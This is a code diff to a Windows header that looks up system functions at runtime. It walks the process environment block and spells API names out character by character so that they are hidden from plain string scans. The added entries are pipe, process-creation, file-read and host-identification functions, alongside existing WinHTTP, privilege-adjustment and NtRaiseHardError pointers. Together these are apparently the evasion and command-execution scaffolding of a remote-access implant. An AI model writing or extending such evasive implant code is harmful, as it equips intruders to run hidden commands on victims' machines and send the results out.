@@ -88,6 +88,41 @@ typedef WINBOOL (WINAPI* _WinHttpSetOption) (
 );
 
 
+typedef WINBOOL (WINAPI* _CreatePipe) (
+	PHANDLE hReadPipe,
+	PHANDLE hWritePipe,
+	LPSECURITY_ATTRIBUTES lpPipeAttributes,
+	DWORD nSize
+);
+typedef WINBOOL (WINAPI* _CreateProcessA) (
+	LPCSTR lpApplicationName,
+	LPSTR lpCommandLine,
+	LPSECURITY_ATTRIBUTES lpProcessAttributes,
+	LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	WINBOOL bInheritHandles,
+	DWORD dwCreationFlags,
+	LPVOID lpEnvironment,
+	LPCSTR lpCurrentDirectory,
+	LPSTARTUPINFOA lpStartupInfo,
+	LPPROCESS_INFORMATION lpProcessInformation
+);
+typedef WINBOOL (WINAPI* _CloseHandle) (HANDLE hObject);
+typedef WINBOOL (WINAPI* _ReadFile) (
+	HANDLE hFile,
+	LPVOID lpBuffer,
+	DWORD nNumberOfBytesToRead,
+	LPDWORD lpNumberOfBytesRead,
+	LPOVERLAPPED lpOverlapped
+);
+typedef DWORD (WINAPI* _WaitForSingleObject) (
+	HANDLE hHandle,
+	DWORD dwMilliseconds
+);
+typedef WINBOOL (WINAPI* _SetCurrentDirectoryA) (LPCSTR lpPathName);
+typedef WINBOOL (WINAPI* _GetComputerNameW) (LPWSTR lpBuffer, LPDWORD nSize);
+typedef DWORD (WINAPI* _GetCurrentProcessId) (VOID);
+
+
 typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege) (
     ULONG    privilege,
     BOOLEAN  enable,
@@ -114,11 +149,11 @@ namespace Win32
 	static char STR_LOADLIBRARYA[13]              = {'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0'};
 	static char STR_GETPROCADDRESS[15]            = {'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0'};
 
-	//ntdll.dll
+	// ntdll.dll
 	static char STR_RTLADJUSTPRIVILEGE[19]        = {'R', 't', 'l', 'A', 'd', 'j', 'u', 's', 't', 'P', 'r', 'i', 'v', 'i', 'l', 'e', 'g', 'e', '\0'};
 	static char STR_NTRAISEHARDERROR[17]          = {'N', 't', 'R', 'a', 'i', 's', 'e', 'H', 'a', 'r', 'd', 'E', 'r', 'r', 'o', 'r', '\0'};
 
-	//ntdll.dll
+	// winhttp.dll
 	static char STR_WINHTTPOPEN[12] 		       = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', '\0'};
 	static char STR_WINHTTPCONNECT[15]            = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', '\0'};
 	static char STR_WINHTTPOPENREQUEST[19]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', '\0'};
@@ -132,8 +167,17 @@ namespace Win32
 	static char STR_WINHTTPCLOSEHANDLE[19]        = {'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
 	static char STR_WINHTTPSETOPTION[17]          = {'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 't', 'O', 'p', 't', 'i', 'o', 'n', '\0'};
 
-
-    static PVOID GetKernel32(void)
+	// kernel32.dll
+	static char STR_CREATEPIPE[]           = {'C', 'r', 'e', 'a', 't', 'e', 'P', 'i', 'p', 'e', '\0'};
+	static char STR_CREATEPROCESSA[]       = {'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', '\0'};
+	static char STR_READFILE[]             = {'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', '\0'};
+	static char STR_CLOSEHANDLE[]          = {'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0'};
+	static char STR_WAITFORSINGLEOBJECT[]  = {'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', '\0'};
+	static char STR_SETCURRENTDIRECTORYA[] = {'S', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'D', 'i', 'r', 'e', 'c', 't', 'o', 'r', 'y', 'A', '\0'};
+	static char STR_GETCOMPUTERNAMEW[]     = {'G', 'e', 't', 'C', 'o', 'm', 'p', 'u', 't', 'e', 'r', 'N', 'a', 'm', 'e', 'W', '\0'};
+	static char STR_GETCURRENTPROCESSID[]  = {'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', '\0'};
+    
+	static PVOID GetKernel32(void)
     {
         PEB*                  peb            = (PEB*)__readgsqword(0x60);
         LDR_DATA_TABLE_ENTRY* pKernel32Entry = CONTAINING_RECORD(peb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
@@ -178,6 +222,15 @@ namespace Win32
 
 	static _RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(Ntdll, STR_RTLADJUSTPRIVILEGE);
 	static _NtRaiseHardError   NtRaiseHardError   = (_NtRaiseHardError)GetProcAddress(Ntdll, STR_NTRAISEHARDERROR);
+
+	static _CreatePipe           CreatePipe           = (_CreatePipe)GetProcAddress(Kernel32, STR_CREATEPIPE);
+	static _CreateProcessA       CreateProcessA       = (_CreateProcessA)GetProcAddress(Kernel32, STR_CREATEPROCESSA);
+	static _ReadFile             ReadFile             = (_ReadFile)GetProcAddress(Kernel32, STR_READFILE);
+	static _CloseHandle          CloseHandle          = (_CloseHandle)GetProcAddress(Kernel32, STR_CLOSEHANDLE);
+	static _WaitForSingleObject  WaitForSingleObject  = (_WaitForSingleObject)GetProcAddress(Kernel32, STR_WAITFORSINGLEOBJECT);
+	static _SetCurrentDirectoryA SetCurrentDirectoryA = (_SetCurrentDirectoryA)GetProcAddress(Kernel32, STR_SETCURRENTDIRECTORYA);
+	static _GetComputerNameW     GetComputerNameW     = (_GetComputerNameW)GetProcAddress(Kernel32, STR_GETCOMPUTERNAMEW);
+	static _GetCurrentProcessId  GetCurrentProcessId  = (_GetCurrentProcessId)GetProcAddress(Kernel32, STR_GETCURRENTPROCESSID);
 } // namespace Win32
 
 #endif
